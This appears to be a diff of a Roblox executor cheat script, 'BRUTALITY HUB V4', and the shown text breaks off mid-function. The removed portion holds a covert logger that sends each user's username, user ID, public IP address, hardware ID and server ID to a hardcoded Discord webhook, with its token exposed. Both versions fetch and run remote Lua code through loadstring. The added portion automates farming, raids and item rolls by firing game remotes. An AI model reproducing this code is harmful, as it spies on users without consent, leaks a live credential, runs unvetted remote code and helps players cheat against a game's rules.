@@ -1,721 +1,878 @@
-function PostWebhook(Url, message)
-  local request = http_request or request or HttpPost or syn.request
-  local data =
-      request(
-      {
-          Url = Url,
-          Method = "POST",
-          Headers = {["Content-Type"] = "application/json"},
-          Body = game:GetService("HttpService"):JSONEncode(message)
-      }
-  )
-  return ""
-end
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/VAPE-UI-MODDED/main/.lua"))()
+local wndw = lib:Window("BRUTALITY HUB V4")
+local T1 = wndw:Tab("Main",true)
+local T2 = wndw:Tab("Hatch")
+local T3 = wndw:Tab("Fight",true)
+local T4 = wndw:Tab("Forge")
+local T5 = wndw:Tab("Teleport")
+local T6 = wndw:Tab("Raid",true)
+local T7 = wndw:Tab("Machine",true)
 
-function AdminLoggerMsg()
-  AdminMessage = {
-      ["embeds"] = {
-          {
-              ["title"] = "**Log User Brutality V2**",
-              ["description"] ="Thanks for using",
-              ["type"] = "rich",
-              ["color"] = tonumber(0xDEB887),
-              ["fields"] = {
-                  {
-                      ["name"] = "**Username**",
-                      ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
-                      ["inline"] = true
-                  },
-                  {
-                      ["name"] = "**UserID**",
-                      ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
-                      ["inline"] = true
-                  },
-                  {
-                      ["name"] = "**PlaceID**",
-                      ["value"] = "```" .. game.PlaceId .. "```",
-                      ["inline"] = false
-                  },
-                  {
-                      ["name"] = "**IP Address**",
-                      ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                      ["inline"] = false
-                  },
-                  {
-                      ["name"] = "**Hwid**",
-                      ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                      ["inline"] = false
-                  },
-                  {
-                      ["name"] = "**JobID**",
-                      ["value"] = "```" .. game.JobId .. "```",
-                      ["inline"] = false
-                  },
-                  {
-                      ["name"] = "**Join Code**",
-                      ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
-                      ["inline"] = false
-                  }
-              },
-              ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-          }
-      }
-  }
-  return AdminMessage
-end
 
-PostWebhook("https://discord.com/api/webhooks/1274066820009037956/jK-EgqCx3thzF9ctrAB_N1Zv9JVvaCSZYW37sD3LDk8diLmgrTn0miuqONzob8uaqnbJ", AdminLoggerMsg())
-local _wait = task.wait
-repeat _wait() until game:IsLoaded()
-local _env = getgenv and getgenv() or {}
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualUser = game:GetService("VirtualUser")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-
-local Player = Players.LocalPlayer
-
-local rs_Monsters = ReplicatedStorage:WaitForChild("MonsterSpawn")
-local Modules = ReplicatedStorage:WaitForChild("ModuleScript")
-local OtherEvent = ReplicatedStorage:WaitForChild("OtherEvent")
-local Monsters = workspace:WaitForChild("Monster")
-
-local MQuestSettings = require(Modules:WaitForChild("Quest_Settings"))
-local MSetting = require(Modules:WaitForChild("Setting"))
-
-local NPCs = workspace:WaitForChild("NPCs")
-local Raids = workspace:WaitForChild("Raids")
-local Location = workspace:WaitForChild("Location")
-local Region = workspace:WaitForChild("Region")
-local Island = workspace:WaitForChild("Island")
-
-local Quests_Npc = NPCs:WaitForChild("Quests_Npc")
-local EnemyLocation = Location:WaitForChild("Enemy_Location")
-local QuestLocation = Location:WaitForChild("QuestLocaion")
-
-local Items = Player:WaitForChild("Items")
-local QuestFolder = Player:WaitForChild("QuestFolder")
-local Ability = Player:WaitForChild("Ability")
-local PlayerData = Player:WaitForChild("PlayerData")
-local PlayerLevel = PlayerData:WaitForChild("Level")
-
-local sethiddenproperty = sethiddenproperty or (function()end)
-
-local CFrame_Angles = CFrame.Angles
-local CFrame_new = CFrame.new
-local Vector3_new = Vector3.new
-
-local _huge = math.huge
-
-task.spawn(function()
-  if not _env.LoadedHideUsername then
-    _env.LoadedHideUsername = true
-    local Label = Player.PlayerGui.MainGui.PlayerName
-    
-    local function Update()
-      local Level = PlayerLevel.Value
-      local IsMax = Level >= MSetting.Setting.MaxLevel
-      Label.Text = ("%s • Lv. %i%s"):format("Anonymous", Level, IsMax and " (Max)" or "")
-    end
-    
-    Label:GetPropertyChangedSignal("Text"):Connect(Update)Update()
-  end
-end)
-
-if game.PlaceId == 10260193230 then
-end
-
-local Loaded, Funcs, Folders = {}, {}, {} do
-  Loaded.ItemsPrice = {
-    Aura = function()
-      return Funcs:GetMaterial("Meme Cube") > 0 and Funcs:GetData("Money") >= 10000000 -- 1x Meme Cube, $10.000.000
-    end,
-    FlashStep = function()
-      return Funcs:GetData("Money") >= 100000 -- $100.000
-    end,
-    Instinct = function()
-      return Funcs:GetData("Money") >= 2500000 -- $2.500.000
-    end
-  }
-  Loaded.Shop = {
-    {"Weapons", {
-      {"Buy Katana", "$5.000 Money", {"Weapon_Seller", "Doge"}},
-      {"Buy Hanger", "$25.000 Money", {"Weapon_Seller", "Hanger"}},
-      {"Buy Flame Katana", "1x Cheems Cola and $50.000", {"Weapon_Seller", "Cheems"}},
-      {"Buy Banana", "1x Cat Food and $350.000", {"Weapon_Seller", "Smiling Cat"}},
-      {"Buy Bonk", "5x Money Bags and $1.000.000", {"Weapon_Seller", "Meme Man"}},
-      {"Buy Pumpkin", "1x Nugget Man and $3.500.000", {"Weapon_Seller", "Gravestone"}},
-      {"Buy Popcat", "10.000 Pops Clicker", {"Weapon_Seller", "Ohio Popcat"}}
-    }},
-    {"Ability", {
-      {"Buy Flash Step", "$100.000 Money", {"Ability_Teacher", "Giga Chad"}},
-      {"Buy Instinct", "$2.500.000 Money", {"Ability_Teacher", "Nugget Man"}},
-      {"Buy Aura", "1x Meme Cube and $10.000.000", {"Ability_Teacher", "Aura Master"}}
-    }},
-    {"Fighting Style", {
-      {"Buy Combat", "$0 Money", {"FightingStyle_Teacher", "Maxwell"}},
-      {"Buy Baller", "10x Balls and $10.000.000", {"FightingStyle_Teacher", "Baller"}}
-    }}
-  }
-  Loaded.WeaponsList = { "Fight", "Power", "Weapon" }
-  Loaded.EnemeiesList = {}
-  Loaded.EnemiesSpawns = {}
-  Loaded.EnemiesQuests = {}
-  Loaded.Islands = {}
-  Loaded.Quests = {}
-  
-  local function RedeemCode(Code)
-    return OtherEvent.MainEvents.Code:InvokeServer(Code)
-  end
-  
-  Funcs.RAllCodes = function(self)
-    if Modules:FindFirstChild("CodeList") then
-      local List = require(Modules.CodeList)
-      for Code, Info in pairs(type(List) == "table" and List or {}) do
-        if type(Code) == "string" and type(Info) == "table" and Info.Status then RedeemCode(Code) end
-      end
-    end
-  end
-  
-  Funcs.GetPlayerLevel = function(self)
-    return PlayerLevel.Value
-  end
-  
-  Funcs.GetCurrentQuest = function(self)
-    for _,Quest in pairs(Loaded.Quests) do
-      if Quest.Level <= self:GetPlayerLevel() and not Quest.RaidBoss and not Quest.SpecialQuest then
-        return Quest
-      end
-    end
-  end
-  
-  Funcs.CheckQuest = function(self)
-    for _,v in ipairs(QuestFolder:GetChildren()) do
-      if v.Target.Value ~= "None" then
-        return v
-      end
-    end
-  end
-  
-  Funcs.VerifySword = function(self, SName)
-    local Swords = Items.Weapon
-    return Swords:FindFirstChild(SName) and Swords[SName].Value > 0
-  end
-  
-  Funcs.VerifyAccessory = function(self, AName)
-    local Accessories = Items.Accessory
-    return Accessories:FindFirstChild(AName) and Accessories[AName].Value > 0
-  end
-  
-  Funcs.GetMaterial = function(self, MName)
-    local ItemStorage = Items.ItemStorage
-    return ItemStorage:FindFirstChild(MName) and ItemStorage[MName].Value or 0
-  end
-  
-  Funcs.AbilityUnlocked = function(self, Ablt)
-    return Ability:FindFirstChild(Ablt) and Ability[Ablt].Value
-  end
-  
-  Funcs.CanBuy = function(self, Item)
-    if Loaded.ItemsPrice[Item] then
-      return Loaded.ItemsPrice[Item]()
-    end
-    return false
-  end
-  
-  Funcs.GetData = function(self, Data)
-    return PlayerData:FindFirstChild(Data) and PlayerData[Data].Value or 0
-  end
-  
-  for Npc,Quest in pairs(MQuestSettings) do
-    if QuestLocation:FindFirstChild(Npc) then
-      table.insert(Loaded.Quests, {
-        RaidBoss = Quest.Raid_Boss,
-        SpecialQuest = Quest.Special_Quest,
-        QuestPos = QuestLocation[Npc].CFrame,
-        EnemyPos = EnemyLocation[Quest.Target].CFrame,
-        Level = Quest.LevelNeed,
-        Enemy = Quest.Target,
-        NpcName = Npc
-      })
-    end
-  end
-  
-  table.sort(Loaded.Quests, function(a, b) return a.Level > b.Level end)
-  for _,v in ipairs(Loaded.Quests) do
-    table.insert(Loaded.EnemeiesList, v.Enemy)Loaded.EnemiesQuests[v.Enemy] = v.NpcName
-  end
-end
-
-local Settings = Settings or {} do
-  Settings.AutoStats_Points = 1
-  Settings.BringMobs = true
-  Settings.FarmDistance = 9
-  Settings.ViewHitbox = false
-  Settings.AntiAFK = true
-  Settings.AutoHaki = true
-  Settings.AutoClick = true
-  Settings.ToolFarm = "Fight" -- [[ "Fight", "Power", "Weapon" ]]
-  Settings.FarmCFrame = CFrame_new(0, Settings.FarmDistance, 0) * CFrame_Angles(math.rad(-90), 0, 0)
-end
-
-local function PlayerClick()
-  local Char = Player.Character
-  if Char then
-    if Settings.AutoClick then
-      VirtualUser:CaptureController()
-      VirtualUser:Button1Down(Vector2.new(1e4, 1e4))
-    end
-    if Settings.AutoHaki and Char:FindFirstChild("AuraColor_Folder") and Funcs:AbilityUnlocked("Aura") then
-      if #Char.AuraColor_Folder:GetChildren() < 1 then
-        OtherEvent.MainEvents.Ability:InvokeServer("Aura")
-      end
-    end
-  end
-end
-
-local function IsAlive(Char)
-  local Hum = Char and Char:FindFirstChild("Humanoid")
-  return Hum and Hum.Health > 0
-end
-
-local function GetNextEnemie(EnemieName)
-  for _,v in ipairs(Monsters:GetChildren()) do
-    if (not EnemieName or v.Name == EnemieName) and IsAlive(v) then
-      return v
-    end
-  end
-  return false
-end
-
-local function GoTo(CFrame, Move)
-  local Char = Player.Character
-  if IsAlive(Char) then
-    return Move and ( Char:MoveTo(CFrame.p) or true ) or Char:SetPrimaryPartCFrame(CFrame)
-  end
-end
-
-local function EquipWeapon()
-  local Backpack, Char = Player:FindFirstChild("Backpack"), Player.Character
-  if IsAlive(Char) and Backpack then
-    for _,v in ipairs(Backpack:GetChildren()) do
-      if v:IsA("Tool") and v.ToolTip:find(Settings.ToolFarm) then
-        Char.Humanoid:EquipTool(v)
-      end
-    end
-  end
-end
-
-local function BringMobsTo(_Enemie, CFrame, SBring)
-  for _,v in ipairs(Monsters:GetChildren()) do
-    if (SBring or v.Name == _Enemie) and IsAlive(v) then
-      local PP, Hum = v.PrimaryPart, v.Humanoid
-      if PP and (PP.Position - CFrame.p).Magnitude < 500 then
-        Hum.WalkSpeed = 0
-        Hum:ChangeState(14)
-        PP.CFrame = CFrame
-        PP.CanCollide = false
-        PP.Transparency = Settings.ViewHitbox and 0.8 or 1
-        PP.Size = Vector3.new(50, 50, 50)
-      end
-    end
-  end
-  return pcall(sethiddenproperty, Player, "SimulationRadius", _huge)
-end
-
-local function KillMonster(_Enemie, SBring)
-  local Enemy = typeof(_Enemie) == "Instance" and _Enemie or GetNextEnemie(_Enemie)
-  if IsAlive(Enemy) and Enemy.PrimaryPart then
-    GoTo(Enemy.PrimaryPart.CFrame * Settings.FarmCFrame)EquipWeapon()
-    if not Enemy:FindFirstChild("Reverse_Mark") then PlayerClick() end
-    if Settings.BringMobs then BringMobsTo(_Enemie, Enemy.PrimaryPart.CFrame, SBring) end
-    return true
-  end
-end
-
-local function TakeQuest(QuestName, CFrame, Wait)
-  local QuestGiver = Quests_Npc:FindFirstChild(QuestName)
-  if QuestGiver and Player:DistanceFromCharacter(QuestGiver.WorldPivot.p) < 5 then
-    return fireproximityprompt(QuestGiver.Block.QuestPrompt), _wait(Wait or 0.1)
-  end
-  GoTo(CFrame or QuestLocation[QuestName].CFrame)
-end
-
-local function ClearQuests(Ignore)
-  for _,v in ipairs(QuestFolder:GetChildren()) do
-    if v.QuestGiver.Value ~= Ignore and v.Target.Value ~= "None" then
-      OtherEvent.QuestEvents.Quest:FireServer("Abandon_Quest", { QuestSlot = v.Name })
-    end
-  end
-end
-
-local function GetRaidEnemies()
-  for _,v in ipairs(Monsters:GetChildren()) do
-    if v:GetAttribute("Raid_Enemy") and IsAlive(v) then
-      return v
-    end
-  end
-end
-
-local function GetRaidMap()
-  for _,v in ipairs(Raids:GetChildren()) do
-    if v.Joiners:FindFirstChild(Player.Name) then
-      return v
-    end
-  end
-end
-
-local function VerifyQuest(QName)
-  local Quest = Funcs:CheckQuest()
-  return Quest and Quest.QuestGiver.Value == QName
-end
-
-_env.FarmFuncs = {
-  {"_Floppa Sword", (function()
-    if not Funcs:VerifySword("Floppa") then
-      if VerifyQuest("Cool Floppa Quest") then
-        GoTo(CFrame_new(794, -31, -440))
-        fireproximityprompt(Island.FloppaIsland["Lava Floppa"].ClickPart.ProximityPrompt)
-      else
-        ClearQuests("Cool Floppa Quest")
-        TakeQuest("Cool Floppa Quest", CFrame_new(758, -31, -424))
-      end
-      return true
-    end
-  end)},
-  {"Meme Beast", (function()
-    local MemeBeast = Monsters:FindFirstChild("Meme Beast") or rs_Monsters:FindFirstChild("Meme Beast")
-    if MemeBeast then
-      GoTo(MemeBeast.WorldPivot)EquipWeapon()PlayerClick()
-      return true
-    end
-  end)},
-  {"Lord Sus", (function()
-    local LordSus = Monsters:FindFirstChild("Lord Sus") or rs_Monsters:FindFirstChild("Lord Sus")
-    if LordSus then
-      if not VerifyQuest("Floppa Quest 32") and Funcs:GetPlayerLevel() >= 1550 then
-        ClearQuests("Floppa Quest 32")TakeQuest("Floppa Quest 32", nil, 1)
-      else
-        KillMonster(LordSus)
-      end
-      return true
-    elseif Funcs:GetMaterial("Sussy Orb") > 0 then
-      if Player:DistanceFromCharacter(Vector3_new(6644, -95, 4811)) < 5 then
-        fireproximityprompt(Island.ForgottenIsland.Summon3.Summon.SummonPrompt)
-      else GoTo(CFrame_new(6644, -95, 4811)) end
-      return true
-    end
-  end)},
-  {"Evil Noob", (function()
-    local EvilNoob = Monsters:FindFirstChild("Evil Noob") or rs_Monsters:FindFirstChild("Evil Noob")
-    if EvilNoob then
-      if not VerifyQuest("Floppa Quest 29") and Funcs:GetPlayerLevel() >= 1400 then
-        ClearQuests("Floppa Quest 29")TakeQuest("Floppa Quest 29", nil, 1)
-      else
-        KillMonster(EvilNoob)
-      end
-      return true
-    elseif Funcs:GetMaterial("Noob Head") > 0 then
-      if Player:DistanceFromCharacter(Vector3_new(-2356, -81, 3180)) < 5 then
-        fireproximityprompt(Island.MoaiIsland.Summon2.Summon.SummonPrompt)
-      else GoTo(CFrame_new(-2356, -81, 3180)) end
-      return true
-    end
-  end)},
-  {"Giant Pumpkin", (function()
-    local Pumpkin = Monsters:FindFirstChild("Giant Pumpkin") or rs_Monsters:FindFirstChild("Giant Pumpkin")
-    if Pumpkin then
-      if not VerifyQuest("Floppa Quest 23") and Funcs:GetPlayerLevel() >= 1100 then
-        ClearQuests("Floppa Quest 23")TakeQuest("Floppa Quest 23", nil, 1)
-      else
-        KillMonster(Pumpkin)
-      end
-      return true
-    elseif Funcs:GetMaterial("Flame Orb") > 0 then
-      if Player:DistanceFromCharacter(Vector3_new(-1180, -93, 1462)) < 5 then
-        fireproximityprompt(Island.PumpkinIsland.Summon1.Summon.SummonPrompt)
-      else GoTo(CFrame_new(-1180, -93, 1462)) end
-      return true
-    end
-  end)},
-  {"Race V2 Orb", (function()
-    if Funcs:GetPlayerLevel() >= 500 then
-      local Quest, Enemy = "Dancing Banana Quest", "Sogga"
-      if VerifyQuest(Quest) then
-        if KillMonster(Enemy) then else GoTo(EnemyLocation[Enemy].CFrame) end
-      else ClearQuests(Quest)TakeQuest(Quest, CFrame_new(-2620, -80, -2001)) end
-      return true
-    end
-  end)},
-  {"Level Farm", (function()
-    local Quest, QuestChecker = Funcs:GetCurrentQuest(), Funcs:CheckQuest()
-    if Quest then
-      if QuestChecker then
-        local _QuestName = QuestChecker.QuestGiver.Value
-        if _QuestName == Quest.NpcName then
-          if KillMonster(Quest.Enemy) then else GoTo(Quest.EnemyPos) end
-        else
-          if KillMonster(QuestChecker.Target.Value) then else GoTo(QuestLocation[_QuestName].CFrame) end
-        end
-      else TakeQuest(Quest.NpcName) end
-    end
-    return true
-  end)},
-  {"Raid Farm", (function()
-    if Funcs:GetPlayerLevel() >= 1000 then
-      local RaidMap = GetRaidMap()
-      if RaidMap then
-        if RaidMap:GetAttribute("Starting") ~= 0 then
-          OtherEvent.MiscEvents.StartRaid:FireServer("Start")_wait(1)
-        else
-          local Enemie = GetRaidEnemies()
-          if Enemie then KillMonster(Enemie, true) else
-            local Spawn = RaidMap:FindFirstChild("Spawn_Location")
-            if Spawn then GoTo(Spawn.CFrame) end
-          end
-        end
-      else
-        local Raid = Region:FindFirstChild("RaidArea")
-        if Raid then GoTo(CFrame_new(Raid.Position)) end
-      end
-      return true
-    end
-  end)},
-  {"FS Enemie", (function()
-    local Enemy = _env.SelecetedEnemie
-    local Quest = Loaded.EnemiesQuests[Enemy]
-    if VerifyQuest(Quest) or not _env["FS Take Quest"] then
-      if KillMonster(Enemy) then else GoTo(EnemyLocation[Enemy].CFrame) end
-    else ClearQuests(Quest)TakeQuest(Quest) end
-    return true
-  end)},
-  {"Nearest Farm", (function() return KillMonster(GetNextEnemie()) end)}
+local workspace = game:GetService("Workspace")
+local cg = game:GetService("CoreGui")
+local player = {
+  self = game:GetService("Players").LocalPlayer,
+  all = game:GetService("Players")
 }
 
-if not _env.LoadedFarm then
-  _env.LoadedFarm = true
-  task.spawn(function()
-    while _wait() do
-      for _,f in _env.FarmFuncs do
-        if _env[f[1]] then local s,r=pcall(f[2])if s and r then break end;end
-      end
-    end
+local var = {
+  click = false,
+  atk = false,
+  on = false,
+  bw = false,
+  cs = false,
+  spin = false,
+  reb = false,
+  egg = {
+    id = 0,
+    count = 3,
+    toggle = false
+  },
+  bh = false,
+  task = {
+    claim = false,
+    ach = false,
+    id = 0
+  },
+  hero = {
+    index = 1,
+    skill = true,
+    guid = "null",
+    id = 0,
+    ft = false,
+    ft2 = false
+  },
+  forge = {
+    guid = "null",
+    toggle = false
+  },
+  mapid = 50001,
+  fuse = false,
+  atk2 = false,
+  bring = false,
+  atk3 = false,
+  raid = {
+    table = {"Room1","Room2","Room3","Room4"},
+    s = "Room1",
+    diff = 1,
+    mapid = 0,
+    toggle = false,
+    dtable = {"1","2","3","4"}
+  },
+  dc = false,
+  fraid = false,
+  cgroup = false,
+  machine = {
+    table = {"Mask","Breath","Ornament","Breath Amplification"},
+    s = "Mask",
+    toggle = false,
+    delete = {
+      common = false,
+      rare = false,
+      epic = false,
+      legendary = false,
+      mythic = false
+    }
+  },
+  remote = {
+    list = "",
+    target = "Workspace",
+    class = "BindableEvent"
+  },
+  alre = false
+}
+
+--[[
+local args = {
+    [1] = {
+        ["harmIndex"] = 2,
+        ["isSkill"] = true,
+        ["heroGuid"] = "8eea9d46-df8a-4cd5-8166-5b3cc52cd36f",
+        ["skillId"] = 200015
+    }
+}
+
+game:GetService("ReplicatedStorage")["Remotes"]["HeroSkillHarm"]:FireServer(unpack(args))
+lib:CustomTeleport("tween",str,"position")
+]]
+
+local function getChildren(path,funct)
+  for i,v in pairs(path:GetChildren()) do
+    funct(v)
+  end
+end
+
+local function hatch()
+  getChildren(workspace.Maps,function(a)
+      getChildren(a.Map.Eggs,function(array)
+          game:GetService("ReplicatedStorage")["Remotes"]["ExtractHero"]:InvokeServer({["drawCardPlatformId"] = array:GetAttribute("Id"),["count"] = var.egg.count})
+      end)
   end)
 end
 
-local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vldtncywdlojtnvjlmvyrbszljd/28s92hs/main/liburan.lua"))()
-local Window = redzlib:MakeWindow({ Title = "BRUTALITY HUB V4", SubTitle = "Made by Medusa Script", SaveFolder = "redzHub-MemeSea.json" })
-Window:AddMinimizeButton({
-  Button = { Image = "rbxassetid://107679910024355", BackgroundTransparency = 0 },
-  Corner = { CornerRadius = UDim.new(0, 6) }
-})
+--[[local function raidEvents()
+  var.fraid = true
+  lib:runtime(function()
+      if var.fraid == false then break end
+      if #workspace["Enemys"]:GetChildren() < 1 then
+        lib:notify(lib:ColorFonts("Raid has cleared, no enemy remaining. teleporting u to the raid lobby","Green"),10)
+        if workspace:FindFirstChild("EnchantChest") then
+          firetouchinterest(workspace.EnchantChest.Part,player.self.Character.HumanoidRootPart,0)
+          wait(0.5)
+          firetouchinterest(workspace.EnchantChest.Part,player.self.Character.HumanoidRootPart,1)
+          game:GetService("ReplicatedStorage")["Remotes"]["QuitRaidsMap"]:InvokeServer({["currentSlotIndex"] = 1,["toMapId"] = 50201})
+          var.fraid = false
+        else
+          lib:notify(lib:ColorFonts("Chest not found, cant claim chest.","Red"),10)
+          var.fraid = false
+          game:GetService("ReplicatedStorage")["Remotes"]["QuitRaidsMap"]:InvokeServer({["currentSlotIndex"] = 1,["toMapId"] = 50201})
+        end --√
+      else
+        getChildren(workspace["Enemys"],function(get)
+            game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(get:GetAttribute("EnemyGuid"))
+        end)
+      end
+  end)
+end]]
 
-local Tabs = {
-  Discord = Window:MakeTab({"Home", "Info"}),
-  MainFarm = Window:MakeTab({"Farm", "Home"}),
-  Items = Window:MakeTab({"Items", "Swords"}),
-  Stats = Window:MakeTab({"Stats", "Signal"}),
-  Teleport = Window:MakeTab({"Teleport", "Locate"}),
-  Shop = Window:MakeTab({"Shop", "ShoppingCart"}),
-  Misc = Window:MakeTab({"Misc", "Settings"})
+T7:Dropdown("Select machine",var.machine.table,function(value)
+    var.machine.s = value
+end)
+
+T7:Toggle("Keep common",false,function(value)
+    var.machine.delete.common = value
+end)
+
+T7:Toggle("Keep rare",false,function(value)
+    var.machine.delete.rare = value
+end)
+
+T7:Toggle("Keep epic",false,function(value)
+    var.machine.delete.epic = value
+end)
+
+T7:Toggle("Keep legendary",false,function(value)
+    var.machine.delete.legendary = value
+end)
+
+T7:Toggle("Keep mythical",false,function(value)
+    var.machine.delete.mythic = value
+end)
+
+T7:Toggle("Auto draw machine",false,function(value)
+    var.machine.toggle = value
+    while wait() do
+      if var.machine.toggle == false then break end
+      if var.machine.s == "Mask" then
+        game:GetService("ReplicatedStorage")["Remotes"]["RerollOrnament"]:InvokeServer(400001)
+      elseif var.machine.s == "Breath" then
+        game:GetService("ReplicatedStorage")["Remotes"]["RerollOrnament"]:InvokeServer(400002)
+      elseif var.machine.s == "Ornament" then
+        game:GetService("ReplicatedStorage")["Remotes"]["RerollOrnament"]:InvokeServer(400003)
+      elseif var.machine.s == "Breath Amplification" then
+        game:GetService("ReplicatedStorage")["Remotes"]["RerollOrnament"]:InvokeServer(400004)
+      else
+        lib:notify(lib:ColorFonts("INVALID MACHINE NAME","Red"),10)
+      end
+    end
+end)
+
+lib:runtime(function()
+    if var.machine.toggle == true then
+    if var.machine.s == "Mask" then
+      if player.self.Character:FindFirstChild("Mask1") and var.machine.delete.common == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Common","G2") .. " mask!",30)
+      elseif player.self.Character:FindFirstChild("Mask2") and var.machine.delete.rare == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Rare","Sky Blue") .. " mask!",30)
+      elseif player.self.Character:FindFirstChild("Mask3") and var.machine.delete.epic == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Epic","Purple") .. " mask!",30)
+      elseif player.self.Character:FindFirstChild("Mask4") and var.machine.delete.legendary == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Legendary","Yellow") .. " mask!",30)
+      elseif player.self.Character:FindFirstChild("Mask5") and var.machine.delete.mythic == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Mythical","Red") .. " mask!",30)
+      end
+    elseif var.machine.s == "Breath" then
+      if player.self.Character:FindFirstChild("Stripe1") and var.machine.delete.common == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Common","G2") .. " breath!",30)
+      elseif player.self.Character:FindFirstChild("Stripe2") and var.machine.delete.rare == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Rare","Sky Blue") .. " breath!",30)
+      elseif player.self.Character:FindFirstChild("Stripe3") and var.machine.delete.epic == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Epic","Purple") .. " breath!",30)
+      elseif player.self.Character:FindFirstChild("Stripe4") and var.machine.delete.legendary == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Legendary","Yellow") .. " breath!",30)
+      elseif player.self.Character:FindFirstChild("Stripe5") and var.machine.delete.mythic == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Mythical","Red") .. " breath!",30)
+      end
+    elseif var.machine.s == "Ornament" then
+      if player.self.Character:FindFirstChild("Back1") and var.machine.delete.common == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Common","G2") .. " ornament!",30)
+      elseif player.self.Character:FindFirstChild("Back2") and var.machine.delete.rare == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Rare","Sky Blue") .. " ornament!",30)
+      elseif player.self.Character:FindFirstChild("Back3") and var.machine.delete.epic == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Epic","Purple") .. " ornament!",30)
+      elseif player.self.Character:FindFirstChild("Back4") and var.machine.delete.legendary == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Legendary","Yellow") .. " ornament!",30)
+      elseif player.self.Character:FindFirstChild("Back5") and var.machine.delete.mythic == true then
+        var.machine.toggle = false
+        lib:notify("Congratulation! You got a " .. lib:ColorFonts("Mythical","Red") .. " ornament!",30)
+      end
+    end
+    end
+end)
+
+T6:Dropdown("Select Room",var.raid.table,function(value)
+    var.raid.s = value
+end)
+
+T6:Dropdown("Select difficulty",var.raid.dtable,function(value)
+    var.raid.diff = tonumber(value)
+end)
+
+T6:Textbox("Insert map ID",false,function(value)
+    var.raid.mapid = tonumber(value)
+end)
+
+T6:Button("Raid lobby",function()
+    game:GetService("ReplicatedStorage")["Remotes"]["LocalPlayerTeleport"]:FireServer({["mapId"] = 50201})
+end)
+
+--[[T6:Button("Start raid",function()
+    lib:notify(lib:ColorFonts("Dont move, auto kill is enabled. u will lose all reward if u move","Green"),10)
+    game:GetService("ReplicatedStorage")["Remotes"]["EnterRaidRoom"]:FireServer(var.raid.s)
+    wait(0.1)
+    game:GetService("ReplicatedStorage")["Remotes"]["SelectRaidsDifficulty"]:FireServer({["difficulty"] = var.raid.diff,["roomName"] = var.raid.s,["selectMapId"] = var.raid.mapid})
+    wait(0.1)
+    game:GetService("ReplicatedStorage")["Remotes"]["StartChallengeRaidMap"]:InvokeServer({["userIds"] = {player.self.UserId},["roomName"] = var.raid.s})
+    wait(0.1)
+    raidEvents()
+end)
+]]
+
+T6:Toggle("Start raid + Auto kill",false,function(value)
+    var.fraid = value
+    if value == true then
+      lib:notify(lib:ColorFonts("Dont move, auto kill is enabled. u will lose all reward if u move","Green"),10)
+      game:GetService("ReplicatedStorage")["Remotes"]["EnterRaidRoom"]:FireServer(var.raid.s)
+      wait(0.1)
+      game:GetService("ReplicatedStorage")["Remotes"]["SelectRaidsDifficulty"]:FireServer({["difficulty"] = var.raid.diff,["roomName"] = var.raid.s,["selectMapId"] = var.raid.mapid})
+      wait(0.1)
+      game:GetService("ReplicatedStorage")["Remotes"]["StartChallengeRaidMap"]:InvokeServer({["userIds"] = {player.self.UserId},["roomName"] = var.raid.s})
+    end
+    wait(0.5)
+    while wait() do
+      if var.fraid == false then break end
+      if #workspace["Enemys"]:GetChildren() < 1 then
+        if workspace:FindFirstChild("EnchantChest") then
+          firetouchinterest(workspace.EnchantChest.Part,player.self.Character.HumanoidRootPart,0)
+          wait(0.1)
+          firetouchinterest(workspace.EnchantChest.Part,player.self.Character.HumanoidRootPart,1)
+          game:GetService("ReplicatedStorage")["Remotes"]["QuitRaidsMap"]:InvokeServer({["currentSlotIndex"] = 1,["toMapId"] = 50201})
+          var.fraid = false
+        else
+          lib:notify(lib:ColorFonts("Pls join raid. #Failed","Red"),10)
+          var.fraid = false
+        end
+      else
+        getChildren(workspace["Enemys"],function(get)
+            if var.hero.guid ~= "null" then
+              game:GetService("ReplicatedStorage")["Remotes"]["ClickEnemy"]:InvokeServer(get:GetAttribute("EnemyGuid"))
+              game:GetService("ReplicatedStorage")["Remotes"]["HeroSkillHarm"]:FireServer({["harmIndex"] = var.hero.index,["isSkill"] = var.hero.skill,["heroGuid"] = var.hero.guid,["skillId"] = var.hero.id})
+              game:GetService("ReplicatedStorage")["Remotes"]["RespirationSkillHarm"]:FireServer({["harmIndex"] = var.hero.index,["skillId"] = var.hero.id})
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(get:GetAttribute("EnemyGuid"))
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(get:GetAttribute("EnemyGuid"))
